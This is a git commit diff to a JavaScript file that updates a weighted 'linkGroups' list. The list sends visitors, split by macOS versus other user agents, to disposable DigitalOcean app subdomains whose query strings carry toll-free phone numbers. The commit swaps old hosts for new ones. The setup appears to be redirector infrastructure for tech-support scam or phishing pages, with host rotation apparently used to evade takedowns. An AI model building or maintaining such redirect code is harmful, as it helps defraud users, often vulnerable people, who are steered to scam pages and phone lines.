e803969c616573f92d1b04606f3cb4856450e7ac
animalinside <akshay.anand12@yahoo.com>
2026-05-14 05:18:47 +0530

    Update URLs for macOS and others in linkGroups

--- index.js
+++ index.js
@@ -51,14 +51,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://monkfish-app-nxgcl.ondigitalocean.app/merrx01usahtml/?bcda=1800 033 905",
-            others: "https://monkfish-app-nxgcl.ondigitalocean.app/werrx01USAHTML/?bcda=1800 033 905"
+            macos: "https://lobster-app-mgaeg.ondigitalocean.app/merrx01usahtml/?bcda=1800 033 905",
+            others: "https://lobster-app-mgaeg.ondigitalocean.app/werrx01USAHTML/?bcda=1800 033 905"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://seashell-app-umzdz.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594",
-            others: "https://seashell-app-umzdz.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594"
+            macos: "https://squid-app-cxkop.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594",
+            others: "https://squid-app-cxkop.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594"
         }
     ];
 
